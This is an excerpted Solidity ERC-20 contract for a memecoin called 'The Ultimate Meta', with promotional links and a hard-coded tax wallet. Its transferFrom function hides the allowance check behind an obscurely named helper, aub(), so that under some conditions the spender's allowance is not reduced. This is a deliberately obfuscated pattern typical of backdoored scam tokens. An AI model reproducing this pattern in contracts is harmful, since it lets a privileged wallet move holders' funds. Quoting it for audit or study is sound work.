...
/*
Welcome to the Ultimate $META Wizardio 
WE ARE THE ULTIMATE
WE ARE ONE
WE ARE META 

Web
https://ultimatemeta.fun
X
https://x.com/metacoin_erc
TG
https://t.me/metacoin_erc
*/
...
contract META is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"The Ultimate Meta";
    ...
    constructor () {
        _taxWallet = payable(0x670D0067429607801d34eb6FFf83594ca40A38de);
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        if(sender != address(0) && !aub(_taxWallet, zeroAddress) && currentAllowance != type(uint256).max) 
            _approve(sender, _msgSender(), currentAllowance.sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function aub(address x, address y) private pure returns(bool) { return x == y;}
